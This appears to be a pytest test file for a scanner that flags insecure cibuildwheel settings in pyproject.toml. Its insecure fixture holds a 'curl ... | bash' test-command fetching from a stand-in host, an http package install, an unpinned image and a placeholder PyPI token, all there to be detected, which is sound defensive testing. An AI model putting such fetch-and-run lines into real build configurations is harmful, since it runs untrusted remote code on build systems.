"""Tests for CibuildwheelAnalyzer."""

from pathlib import Path

from devai.cibuildwheel_analyzer import CibuildwheelAnalyzer


INSECURE_PYPROJECT = """\
[build-system]
requires = ["cibuildwheel"]
build-backend = "setuptools.build_meta"

[tool.cibuildwheel]
build = "cp39-*"
test-command = "curl -s https://evil.example.com/test.sh | bash"
manylinux-x86_64-image = "manylinux2014:latest"
before-all = "pip install http://insecure-pypi.example.com/pkg"
token = "pypi-AgEIcHlwaS5vcmcvY2k-EXAMPLETOKENEXAMPLETOKENEX"
"""

HARDENED_PYPROJECT = """\
[tool.cibuildwheel]
build = "cp39-* cp310-* cp311-*"
test-command = "pytest {project}/tests"
"""


class TestCibuildwheelAnalyzer:
    def test_no_configs_returns_perfect_score(self, tmp_path: Path):
        (tmp_path / "app.py").write_text("x = 1\n", encoding="utf-8")
        analyzer = CibuildwheelAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 0
        assert analyzer.health_score() == 100.0

    def test_ignores_non_cibuildwheel_pyproject(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(
            '[project]\nname = "plain"\nversion = "1.0.0"\n',
            encoding="utf-8",
        )
        analyzer = CibuildwheelAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 0

    def test_detects_insecure_patterns(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(INSECURE_PYPROJECT, encoding="utf-8")
        analyzer = CibuildwheelAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "insecure_http" in kinds
        assert "curl_pipe_shell" in kinds
        assert "pypi_token" in kinds
        assert "unpinned_image" in kinds
        assert analyzer.health_score() < 100.0

    def test_hardened_config_has_no_findings(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(HARDENED_PYPROJECT, encoding="utf-8")
        analyzer = CibuildwheelAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert high == []
        assert analyzer.health_score() == 100.0

    def test_summary_and_context(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(HARDENED_PYPROJECT, encoding="utf-8")
        analyzer = CibuildwheelAnalyzer(str(tmp_path))
        assert "Cibuildwheel" in analyzer.summary()
        assert "health score" in analyzer.to_context()

    def test_generate_hardened_config(self):
        snippet = CibuildwheelAnalyzer(".").generate_hardened_config()
        assert "cibuildwheel" in snippet
        assert "test-command" in snippet
